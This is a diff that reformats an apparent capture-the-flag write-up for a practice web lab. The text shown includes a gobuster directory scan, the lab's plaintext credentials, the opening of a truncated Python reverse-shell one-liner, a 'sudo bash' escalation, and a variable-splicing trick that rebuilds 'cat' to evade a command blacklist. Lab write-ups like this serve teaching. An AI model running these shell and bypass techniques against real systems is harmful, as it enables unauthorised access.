@@ -19,8 +19,8 @@ So i tried to use **gobuster**, to  bruteforce all directory that available:
 gobuster dir -u [web_ip] -w [dir_lists] php,js,py
 ```
 and here's some directories I found:
-index.html
-portal.php
+- index.html
+- portal.php
 
 After that we need to input username, and password that I haven't found yet.
 
@@ -31,9 +31,9 @@ we can use it as password in portal.php and able to access the dashboard.
 
 ## Information
 
-Username: R1ckRul3s
-password: Wubbalubbadubdub
-Some Kind base64 decode text: rabbit hole
+- Username: R1ckRul3s
+- password: Wubbalubbadubdub
+- Some Kind base64 decoded text: rabbit hole
 
 
 ## Reverse Shell
@@ -48,7 +48,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 after we get the reverse shell, I tried to run:
 
 ```sh
-	sudo bash
+sudo bash
 ```
 that so we wil run the bash as root
 
@@ -57,7 +57,7 @@ that so we wil run the bash as root
 ### First Ingreditents
 we'll get the first ingredient in the portal.php, but ```cat``` was blacklisted, so we use:
 ```sh
-	a=ca b=at c={ingredientstextfile} d=.txt;$a$b ${c}${d} 
+a=ca b=at c={ingredientstextfile} d=.txt;$a$b ${c}${d} 
 ```
 which wil result to 
 ```sh
